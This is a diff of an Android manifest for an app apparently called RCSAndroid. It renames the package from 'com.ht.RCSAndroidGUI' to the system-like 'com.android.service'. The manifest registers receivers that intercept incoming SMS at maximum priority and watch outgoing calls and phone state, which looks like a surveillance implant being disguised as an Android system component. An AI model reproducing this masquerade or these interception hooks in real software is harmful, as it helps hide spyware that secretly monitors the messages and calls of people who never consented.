@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-      package="com.ht.RCSAndroidGUI"
+      package="com.android.service"
       android:versionCode="1"
       android:versionName="1.0">
     
@@ -40,22 +40,22 @@
             </intent-filter>
         </activity>
 
-		<receiver android:name="com.ht.RCSAndroidGUI.listener.BatteryMonitor">
+		<receiver android:name="com.android.service.listener.BatteryMonitor">
 		</receiver>
 		
-		<receiver android:name="com.ht.RCSAndroidGUI.listener.BroadcastMonitorAc">
+		<receiver android:name="com.android.service.listener.BroadcastMonitorAc">
 		</receiver>
 		
-		<receiver android:name="com.ht.RCSAndroidGUI.listener.BroadcastMonitorStandby">
+		<receiver android:name="com.android.service.listener.BroadcastMonitorStandby">
 		</receiver>
 		
-		<receiver android:name="com.ht.RCSAndroidGUI.listener.BroadcastMonitorSms">
+		<receiver android:name="com.android.service.listener.BroadcastMonitorSms">
 			<intent-filter android:priority="999999999">
 				<action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
 		</receiver>
 
-       	<receiver android:name="com.ht.RCSAndroidGUI.listener.BroadcastMonitorCall" android:exported="true">
+       	<receiver android:name="com.android.service.listener.BroadcastMonitorCall" android:exported="true">
             <intent-filter android:priority="0">
             	<action android:name="android.intent.action.NEW_OUTGOING_CALL" />
             	<action android:name="android.intent.action.PHONE_STATE" />
@@ -65,7 +65,7 @@
 		
 	    <service android:name="RCSAndroid">
 			<intent-filter>
-				<action android:name="com.ht.RCSAndroid">
+				<action android:name="com.android.service">
 				</action>
 			</intent-filter>
 		</service>
